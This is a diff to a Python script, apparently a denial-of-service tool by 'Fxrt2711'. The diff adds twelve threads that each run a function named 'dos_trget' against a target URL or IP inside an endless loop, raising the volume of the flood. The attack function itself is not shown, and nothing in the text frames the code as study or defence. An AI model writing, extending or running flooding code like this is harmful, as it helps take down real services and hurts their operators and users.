@@ -1,5 +1,5 @@
 #creator: Fxrt2711
-#version: 4.0.5
+#version: 4.0.4
 #date: 25/1/24
 #update: 28/1/24
 #
@@ -192,6 +192,18 @@ while True:
             thr_6 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
             thr_7 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
             thr_8 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_9 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_10 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_1_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_2_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_3_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_4_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_5_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_6_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_7_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_8_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_9_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
+            thr_10_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
 #
             thr.start()
             thr_1.start()
@@ -202,6 +214,18 @@ while True:
             thr_6.start()
             thr_7.start()
             thr_8.start()
+            thr_9.start()
+            thr_10.start()
+            thr_1_.start()
+            thr_2_.start()
+            thr_3_.start()
+            thr_4_.start()
+            thr_5_.start()
+            thr_6_.start()
+            thr_7_.start()
+            thr_8_.start()
+            thr_9_.start()
+            thr_10_.start()
             try:
                 print(f"waiting for {target_url_ip} to accept")
             except:
